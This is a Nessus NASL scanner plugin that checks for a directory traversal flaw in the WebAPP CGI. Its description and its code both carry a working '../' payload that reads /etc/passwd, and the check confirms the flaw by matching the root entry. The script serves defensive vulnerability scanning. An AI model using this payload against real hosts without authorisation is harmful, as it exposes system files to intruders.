#
# (C) Tenable Network Security
#

if(description)
{
 script_id(14365);
 script_cve_id("CAN-2004-1742");
 script_bugtraq_id(11028);
 script_version("$Revision: 1.3 $");
 
 name["english"] = "WebAPP Directory Traversal";

 script_name(english:name["english"]);
 
 desc["english"] = "
There is a flaw in the remote version of WebApp that may allow an
attacker to read arbitrary files on the remote host with the
privileges of the web server process (httpd or root) by making a
request like :

	 GET /cgi-bin/index.cgi?action=topics&viewcat=../../../../etc/passwd

Solution : Upgrade to the latest version of this software.
Risk factor: Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for a directory traversal bug in WebAPP";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004-2005 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("webapp_detect.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/webapp"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the vulnerability.
  i = 0;
  file = "etc/passwd";
  # nb: the exact installation directory can vary so we iterate a few 
  #     times, prepending "../" to the filename each time.
  while (++i < 10) {
    file = string("../", file);
    req = http_get(
      item:string(
        dir, "/index.cgi?",
        "action=topics&",
        "viewcat=", file
      ),
      port:port
    );
    r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if( r == NULL )exit(0);
    if( egrep(pattern:"root:.*:0:[01]:", string:r) ) {
      security_warning(port);
      exit(0);
    }
  }
}

